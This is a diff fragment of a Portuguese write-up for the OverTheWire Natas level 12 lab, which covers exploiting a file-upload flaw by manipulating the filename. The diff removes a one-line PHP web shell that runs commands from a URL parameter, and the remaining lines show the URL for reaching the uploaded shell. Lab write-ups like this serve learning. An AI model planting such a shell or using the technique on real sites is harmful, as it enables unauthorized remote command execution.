@@ -55,10 +55,6 @@ A vulnerabilidade foi explorada com sucesso ao manipular o campo filename de um 
 
 ## 🧪 Comandos Utilizados
 
-Conteúdo do arquivo shell.php:
-PHP
-
-<?php system($_GET['cmd']); ?>
 Acesso ao shell web (após upload e manipulação do nome):  
 `http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php`  
 Verificar RCE:   
